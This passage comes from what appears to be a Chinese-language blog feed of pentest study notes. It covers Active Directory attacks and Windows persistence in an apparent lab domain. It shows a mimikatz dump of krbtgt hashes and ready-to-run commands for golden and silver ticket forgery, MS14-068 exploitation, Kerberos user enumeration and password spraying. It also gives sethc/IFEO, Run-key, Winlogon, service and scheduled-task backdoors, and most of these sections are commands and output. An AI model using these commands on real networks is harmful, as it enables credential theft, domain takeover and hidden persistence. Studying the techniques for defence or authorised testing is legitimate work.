/user:krbtgt</span></span><br><span class="line">[DC] <span class="string">&#x27;ghost.com&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;WIN-4JS3YOGGQ2T.ghost.com&#x27;</span> will be the DC server</span><br><span class="line">[DC] <span class="string">&#x27;krbtgt&#x27;</span> will be the user account</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line"></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : 2022/3/16 18:25:33</span><br><span class="line">Object Security ID   : S-1-5-21-1238213221-2393825874-2881136966-502</span><br><span class="line">Object Relative ID   : 502</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: a5269d41b184a97adc9b991f2ee21f12</span><br><span class="line">    ntlm- 0: a5269d41b184a97adc9b991f2ee21f12</span><br><span class="line">    lm  - 0: dadc5e38f4551dd9bd6f8673528f3d6a</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : GHOST.COMkrbtgt</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : da6374753cb6f5e191265a283115ced1fe1d2c5e5091d60093903cb90ef67fb7</span><br><span class="line">      aes128_hmac       (4096) : 777c080c663f51196b554d5348ee8123</span><br><span class="line">      des_cbc_md5       (4096) : 5e83f83776ae8a1a</span><br><span class="line">      des_cbc_crc       (4096) : 5e83f83776ae8a1a</span><br><span class="line">      rc4_plain         (4096) : a5269d41b184a97adc9b991f2ee21f12</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : GHOST.COMkrbtgt</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : 5e83f83776ae8a1a</span><br><span class="line">      des_cbc_crc       : 5e83f83776ae8a1a</span><br><span class="line">      rc4_plain         : a5269d41b184a97adc9b991f2ee21f12</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    Kerberos-Newer-Keys</span><br><span class="line"></span><br><span class="line">* Primary:WDigest *</span><br><span class="line">    01  b56b310c7d4d84d51763197cc777e236</span><br><span class="line">    02  f11fc690746ff0c5017fbb804a5afadb</span><br><span class="line">    03  1284d4bd47f80c75715883ecae93aee3</span><br><span class="line">    04  b56b310c7d4d84d51763197cc777e236</span><br><span class="line">    05  f11fc690746ff0c5017fbb804a5afadb</span><br><span class="line">    06  f0858287a155ee5ea15271dca0c480c3</span><br><span class="line">    07  b56b310c7d4d84d51763197cc777e236</span><br><span class="line">    08  bc8cf0c0bb41ee11fd93ce726577cd2e</span><br><span class="line">    09  bc8cf0c0bb41ee11fd93ce726577cd2e</span><br><span class="line">    10  053d15785d6b8e58659321a0c0bbe730</span><br><span class="line">    11  910f26088b80677ff20523ae2f570ad2</span><br><span class="line">    12  bc8cf0c0bb41ee11fd93ce726577cd2e</span><br><span class="line">    13  37dca035e5d9ce4b7539b40dd4a3b711</span><br><span class="line">    14  910f26088b80677ff20523ae2f570ad2</span><br><span class="line">    15  c01bc6cc7073767ae9332d6948012efb</span><br><span class="line">    16  c01bc6cc7073767ae9332d6948012efb</span><br><span class="line">    17  5bef1b58b30a684217b555a9c694b018</span><br><span class="line">    18  c7ddf9a29f31081a0c2c59f0ba887591</span><br><span class="line">    19  6ed3c0509d5ed0b11be6d3cb7d9eec89</span><br><span class="line">    20  2230919d6c19fdc4794a4d4cbf08cbcc</span><br><span class="line">    21  f5e434234d81d0ba2362f17a8b4a61a0</span><br><span class="line">    22  f5e434234d81d0ba2362f17a8b4a61a0</span><br><span class="line">    23  4cf7197a9331618814144057e85b32b6</span><br><span class="line">    24  ada6252d89f49e2cc822fb2545c8a4ac</span><br><span class="line">    25  ada6252d89f49e2cc822fb2545c8a4ac</span><br><span class="line">    26  55c19bbc0da0e9ae00a609c755da8ef5</span><br><span class="line">    27  9df3396f69d865ef7b7fabdd30e5c225</span><br><span class="line">    28  b8685ccf3967652956f90dd8c912dd9f</span><br><span class="line">    29  534307dab20bfd1901a972ed1196c351</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用 mimikatz 生成金票生成.kirbi 文件并保存：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden /admin:new_user_gold /domain:ghost.com /sid:S-1-5-21-1238213221-2393825874-2881136966-502 /krbtgt:a5269d41b184a97adc9b991f2ee21f12 /ticket:ticket.kirbi&quot; exit</span><br><span class="line"></span><br><span class="line">/admin：伪造的用户名</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：SID 值，注意是去掉最后一个-后面的值</span><br><span class="line">/krbtgt：krbtgt 的 HASH 值</span><br><span class="line">/ticket：生成的票据名称 </span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318200338986.png" alt="image-20220318200338986"></p><p>登录域内普通用户，通过 mimikatz 中的 kerberos::ptt 功能将ticket.kirbi 导入内存中。</p><p>导入票据之前访问域控:</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318200449833.png" alt="image-20220318200449833"></p><p>导入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purge</span><br><span class="line">Ticket(s) purge for current session is OK</span><br><span class="line"></span><br><span class="line">mimikatz # kerberos::ptt C:\Users\yutaowin10\Desktop\Tool\mimikatz\ticket.kirbi</span><br><span class="line"></span><br><span class="line">* File: &#x27;C:\Users\yutaowin10\Desktop\Tool\mimikatz\ticket.kir</span><br></pre></td></tr></table></figure><p>再次访问域控即可成功。</p><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>Silver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。</p><p>1.不需要与 KDC 进行交互 </p><p>2.需要 server 的 NTLM hash</p><p>mimikatz：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318202007613.png" alt="image-20220318202007613"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:ghost.com /sid:S-1-5-21-1238213221-2393825874-2881136966-500 /target:WIN-4JS3YOGGQ2T.ghost.com /service:cifs /rc4:520126a03f5d5a8d836f1c4f34ede7ce /user:new_user_gold /ptt</span><br><span class="line"></span><br><span class="line">/domain</span><br><span class="line">/sid</span><br><span class="line">/target:目标服务器的域名全称，此处为域控的全称</span><br><span class="line">/service:目标服务器上面的kerberos服务，此处为cifs</span><br><span class="line">/rc4:计算机账户的NTLM hash，域控主机的计算机账户</span><br><span class="line">/user:要伪造的用户名</span><br></pre></td></tr></table></figure><p>此时可以成功访问域控上的文件共享</p><h3 id="关于黄金票据和白银票据的一些区别"><a href="#关于黄金票据和白银票据的一些区别" class="headerlink" title="关于黄金票据和白银票据的一些区别:"></a>关于黄金票据和白银票据的一些区别:</h3><h4 id="1-访问权限不同"><a href="#1-访问权限不同" class="headerlink" title="1.访问权限不同"></a>1.访问权限不同</h4><ul><li>  Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限</li><li>  Silver Ticket: 伪造TGS,只能访问指定的服务</li></ul><h4 id="2-加密方式不同"><a href="#2-加密方式不同" class="headerlink" title="2.加密方式不同"></a>2.加密方式不同</h4><ul><li>  Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密</li><li>  Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</li></ul><h4 id="3-认证流程不同"><a href="#3-认证流程不同" class="headerlink" title="3.认证流程不同"></a>3.认证流程不同</h4><ul><li>  Golden Ticket 的利用过程需要访问域控(KDC)</li><li>  Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</li></ul><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>能够将任意一台域机器提升成域控相关权限</p><p>利用条件：</p><ul><li>  小于2012R2的域控没有打KB3011780，高版本默认集成</li><li>  无论工作组、域，高低权限都可以使用生成的票据进行攻击</li><li>  域账户使用时需要klist purge清除票据</li></ul><p>环境：</p><blockquote><p>  域控：2008，192.168.188.100，主机名：WIN-4JS3YOGGQ2T</p><p>  域成员：192.168.188.104 ，yutaowin10 ，Admin123！</p></blockquote><p>获取域用户的sid：</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318194110678.png" alt="image-20220318194110678"></p><p>直接生成票据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u yutaowin10@ghost.com -s S-1-5-21-1238213221-2393825874-2881136966-1109 -d 192.168.188.100 -p Admin123!</span><br></pre></td></tr></table></figure><p>使用生成的票据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc TGT_yutaowin10@ghost.com.ccache</span><br></pre></td></tr></table></figure><p>通过域控的主机名访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN-4JS3YOGGQ2T\c$</span><br></pre></td></tr></table></figure><h3 id="域外用户枚举"><a href="#域外用户枚举" class="headerlink" title="域外用户枚举"></a>域外用户枚举</h3><p>在域外也能和域进行交互的原因，是利用了kerberos协议认证中的AS-REQ阶段。只要我们能够访问域控88(kerberos服务)端口，就可以通过这种方式去枚举用户名并且进行kerberos协议的暴力破解了！</p><p>Kerbrute使用的是kerberos pre-auth协议，不会产生大量的日志 (4625 - An account failed to log on)，但是会产生以下日志：</p><ul><li>  口令验证成功时产生日志 (4768 - A Kerberos authentication ticket (TGT) was requested)</li><li>  口令验证失败时产生日志 (4771 - Kerberos pre-authentication failed)</li></ul><h4 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h4><h5 id="kerbrute-windows-amd64-exe"><a href="#kerbrute-windows-amd64-exe" class="headerlink" title="kerbrute_windows_amd64.exe"></a>kerbrute_windows_amd64.exe</h5><blockquote><p>  <a href="https://github.com/ropnop/kerbrute/releases">kerbrute_windows_amd64.exe</a></p></blockquote><p>在这里我们需要获取dc的ip，域名。将想要爆破的用户放入user.txt表中，这样就可以获取到了！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe userenum --dc 192.168.188.100 -d ghost.com user.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318191443842.png" alt="image-20220318191443842"></p><p>之后爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe passwordspray -d 192.168.188.100 -d ghost.com Admin123!</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318191719021.png" alt="image-20220318191719021"></p><h4 id="PY版本-pyKerbrute"><a href="#PY版本-pyKerbrute" class="headerlink" title="PY版本 pyKerbrute"></a>PY版本 pyKerbrute</h4><blockquote><p>  <a href="https://github.com/3gstudent/pyKerbrute">pyKerbrute</a></p></blockquote><p>不演示了，爆破用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 EnumADUser.py 192.168.188.100 ghost.com user.txt tcp</span><br><span class="line">python2 EnumADUser.py 192.168.188.100 ghost.com user.txt udp</span><br></pre></td></tr></table></figure><p>口令爆破：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#明文</span><br><span class="line">python2 ADPwdSpray.py 192.168.188.100 ghost.com user.txt clearpassword Admin123! tcp</span><br><span class="line"></span><br><span class="line">#hash</span><br><span class="line">python2 ADPwdSpray.py 192.168.188.100 ghost.com user.txt ntlmhash aaaaaaaaaaaaaaaaaaaa(hash) udp</span><br></pre></td></tr></table></figure><p>参考：</p><blockquote>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/-V1gEpdsUExwU5Fza2YzrA</span><br><span class="line">https://mp.weixin.qq.com/s/vYeR9FDRUfN2ZczmF68vZQ</span><br><span class="line">https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&amp;mid=2247496592&amp;idx=2&amp;sn=3805d213ba1013e320f48169516c2ca3&amp;chksm=e91523aade62aabc21ebca36a5216f63ec0d4c61e3dd1b4632c10adbb85dfde07e6897897fa5&amp;scene=21#wechat_redirect</span><br><span class="line">https://blog.csdn.net/weixin_41598660/article/details/109152077</span><br><span class="line">https://xz.aliyun.com/t/7724#toc-4</span><br><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</span><br><span class="line">http://hackergu.com/ad-information-search-powerview/</span><br><span class="line">https://www.freebuf.com/news/173366.html</span><br><span class="line">https://www.cnblogs.com/mrhonest/p/13372203.html</span><br><span class="line">https://payloads.online/scripts/Invoke-DomainPasswordSpray.txt</span><br><span class="line">https://github.com/dafthack/DomainPasswordSpray</span><br><span class="line">https://blog.csdn.net/qq_36119192/article/details/105088239</span><br><span class="line">https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe</span><br></pre></td></tr></table></figure></blockquote><h2 id="SPN-扫描"><a href="#SPN-扫描" class="headerlink" title="SPN 扫描"></a>SPN 扫描</h2><blockquote><p>  SPN全程 Service Principal Names，是服务器上所运行服务的唯一标识，每个使用kerberos认证的服务都需要一个SPN。<br>  SPN分为两种，一种注册在AD的机器账户下(Computers)下，另一种注册在域用户账户(Users)下<br>  当一个服务的权限为Local System或Network Service，则SPN注册在机器账户(Computers)下<br>  当一个服务的权限为一个域用户，则SPN注册在域用户账户(Users)下</p></blockquote><p>SPN扫描能让我们更快的发现在域内运行的服务，并且很难被发现</p><h3 id="SPN格式"><a href="#SPN格式" class="headerlink" title="SPN格式"></a>SPN格式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass/host:port/servicename</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>  serviceclass可以理解为服务的名称，常见的有www,ldap,SMTP,DNS,HOST等</li><li>  host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01</li><li>  如果服务运行在默认端口上，则端口号(port)可以省略</li></ul><h3 id="SPN-查询"><a href="#SPN-查询" class="headerlink" title="SPN 查询"></a>SPN 查询</h3><p>查看当前域内的所有SPN:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -q */*</span><br></pre></td></tr></table></figure><p>查询具体域所有SPN：</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319170505083.png" alt="image-20220319170505083"></p><p>以CN开头的每一行代表一个账户，下面的信息是与之关联的SPN<br>对于上面的输出数据，机器账户(Computers)为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CN=WIN-4JS3YOGGQ2T,OU=Domain Controllers,DC=ghost,DC=com</span><br><span class="line">CN=DM_WIN2003,CN=Computers,DC=ghost,DC=com</span><br><span class="line">CN=DM_WINXP,CN=Computers,DC=ghost,DC=com</span><br><span class="line">CN=DM_WIN10,CN=Computers,DC=ghost,DC=com</span><br><span class="line">CN=DM_WIN10_2,CN=Computers,DC=ghost,DC=com</span><br></pre></td></tr></table></figure><p>域用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CN=krbtgt,CN=Users,DC=ghost,DC=com</span><br></pre></td></tr></table></figure><h2 id="域委派"><a href="#域委派" class="headerlink" title="域委派"></a>域委派</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;GitHub：&lt;a href=&quot;https://github.com/Ghostasky/IntranetPenetrationLearn&quot;&gt;https://github.com/Ghostasky/IntranetPenetrationLearn&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;给</summary>
      
    
    
    
    
    <category term="内网" scheme="http://example.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Windows权限维持学习</title>
    <link href="http://example.com/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-03-07T16:00:00.000Z</published>
    <updated>2022-03-08T12:13:05.983Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>简单记录下Windows权限维持的内容。</p><h1 id="0x1-辅助功能镜像劫持"><a href="#0x1-辅助功能镜像劫持" class="headerlink" title="0x1 辅助功能镜像劫持"></a>0x1 辅助功能镜像劫持</h1><p>先前的版本可以直接更换：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">屏幕键盘： C:\Windows\System32\osk.exe</span><br><span class="line">放大镜： C:\Windows\System32\Magnify.exe</span><br><span class="line">旁白： C:\Windows\System32\Narrator.exe</span><br><span class="line">显示切换器 C:\Windows\System32\DisplaySwitch.exe</span><br><span class="line">应用切换器： C:\Windows\System32\AtBroker.exe</span><br></pre></td></tr></table></figure><p>直接命令行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy c:\windows\system32\sethc.ex c:\windows\system32\sethc1.exe</span><br><span class="line">copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe</span><br></pre></td></tr></table></figure><p>高版本需要IFEO。所谓的IFEO就是Image File Execution Options，直译过来就是映像劫持。它又被称为“重定向劫持”（Redirection Hijack），它和“映像劫持”（Image Hijack，或IFEO Hijack）只是称呼不同，实际上都是一样的技术手段。白话来讲就是做某个操作的时候被拦截下来，干了别的事。</p><p>在iexplorer.exe中加键值对：debugger  c:\windows\system32\cmd.exe</p><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308172433830.png" alt="image-20220308172433830"></p><p>或者直接命令行(需要管理员权限)：</p><p><code>reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe&quot; /v &quot;Debugger&quot; /t REG_SZ /d &quot;c:\windows\system32\cmd.exe&quot; /f</code></p><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308172741639.png" alt="image-20220308172741639"></p><h1 id="0x2-启动项-服务后门"><a href="#0x2-启动项-服务后门" class="headerlink" title="0x2.启动项/服务后门"></a>0x2.启动项/服务后门</h1><h2 id="开始菜单启动项"><a href="#开始菜单启动项" class="headerlink" title="开始菜单启动项"></a>开始菜单启动项</h2><p>开始菜单启动项，指示启动文件夹的位置，具体的位置是“开始”菜单中的“所有程序”-“启动”选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\SD\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><p>相关键值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders </span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders </span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders </span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br></pre></td></tr></table></figure><p>重启后会自动自启</p><h2 id="启动项注册表后门"><a href="#启动项注册表后门" class="headerlink" title="启动项注册表后门"></a>启动项注册表后门</h2><p><code>HKEY_CURRENT_USER</code>的改动不需要管理员权限。（更改<code>HKEY_LOCAL_MACHINE</code>需要管理员权限）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308175519252.png" alt="image-20220308175519252"></p><p>同样，重启后会自启动。</p><p>使用命令行，修改hklm，需要管理员：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run   /v &quot;123&quot; /t REG_SZ /d &quot;C:\Windows\System32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure><h2 id="自启动服务后门"><a href="#自启动服务后门" class="headerlink" title="自启动服务后门"></a>自启动服务后门</h2><blockquote><p>  在 Windows上还有一个重要的机制，也就是服务。服务程序通常默默的运行在后台，且拥有 SYSTEM 权限，非常适合用于后门持久化。我们可以将 EXE /DLL等可执行文件注册为服务实现后门持久化。</p></blockquote><p>可以通过如下命令行方式添加一个服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc create asdfadfa binpath=   &quot;C:\Users\SD\Desktop\test.exe&quot;  start= &quot;auto&quot; obj=&quot;LocalSystem&quot;</span><br><span class="line">sc start asdfadfa </span><br></pre></td></tr></table></figure><p>删除服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc delete asdfadfa</span><br></pre></td></tr></table></figure><p>或者powershell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New-Service -Name &quot;pentestlab&quot; -BinaryPathName &quot;C:\temp\pentestlab.exe&quot; -Description &quot;PentestLaboratories&quot; -StartupType Automatic</span><br><span class="line">sc start pentestlab</span><br></pre></td></tr></table></figure><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308181535484.png" alt="image-20220308181535484"></p><h1 id="0x3-系统计划任务后门"><a href="#0x3-系统计划任务后门" class="headerlink" title="0x3.系统计划任务后门"></a>0x3.系统计划任务后门</h1><blockquote><p>  Windows实现定时任务主要有schtasks与at二种方式:</p><p>  At 适用于windows xp/2003，Schtasks适用于win7/2008或者以后</p></blockquote><p><code>taskschd.msc</code></p><p>5min执行一次</p><p><code>schtasks /create /sc minute /mo 5   /tn &quot;aaaa&quot; /tr C:\Windows\System32\cmd.exe</code></p><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308182919522.png" alt="image-20220308182919522"></p><h1 id="0x4-DLL劫持"><a href="#0x4-DLL劫持" class="headerlink" title="0x4.DLL劫持"></a>0x4.DLL劫持</h1><blockquote><p>  DLL劫持漏洞之所以被称为漏洞，还要从负责加载DLL的系统API LoadLibrary 来看。熟悉Windows代 码的同学都知道，调⽤ LoadLibrary 时可以使⽤DLL的相对路径。这时，系统会按照特定的顺序搜索⼀ 些⽬录，以确定DLL的完整路径。根据MSDN⽂档的约定，在使⽤相对路径调⽤ LoadLibrary （同样适 ⽤于其他同类DLL LoadLibraryEx，ShellExecuteEx等）时，系统会依次从以下6个位置去查找所需要的 DLL⽂件（会根据SafeDllSearchMode配置⽽稍有不同）。</p><ol><li> 程序所在⽬录。</li><li> 加载 DLL 时所在的当前⽬录。</li><li> 系统⽬录即 SYSTEM32 ⽬录。</li><li> 16位系统⽬录即 SYSTEM ⽬录。</li><li> Windows⽬录。</li><li> PATH环境变量中列出的⽬录</li></ol><p>  dll劫持就发⽣在系统按照顺序搜索这些特定⽬录时。只要⿊客能够将恶意的DLL放在优先于正常DLL所在的⽬录，就能够欺骗系统优先加载恶意DLL，来实现“劫持”。</p></blockquote><p>在win7及win7以上系统增加了KnownDLLs保护，需要在如下注册表下添加dll才能顺利劫持：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls</span><br></pre></td></tr></table></figure><p><a href="https://www.anquanke.com/post/id/225911">DLL劫持原理及其漏洞挖掘（一）</a></p><h1 id="0x5-Winlogon用户登录初始化"><a href="#0x5-Winlogon用户登录初始化" class="headerlink" title="0x5.Winlogon用户登录初始化"></a>0x5.Winlogon用户登录初始化</h1><p>winlogon.exe是windows中非常重要的进程,在用户还没登录系统之前就已经存在,并与密码验证相关的重要任务精密相关。例如，当在用户登录时，Winlogon 进程负责将用户配置文件加载到注册表中:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKLM\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\</span><br><span class="line">HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</span><br></pre></td></tr></table></figure><p>命令行:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg delete &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v Userinit /f</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;  /v &quot;Userinit&quot; /t REG_SZ /d &quot;C:\Windows\system32\cmd.exe,&quot; /f</span><br></pre></td></tr></table></figure><p>powershell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty   &quot;HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon&quot; -name   Userinit -value &quot;C:\Windows\system32\userinit.exe,C:\Windows\system32\cmd.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308184001989.png" 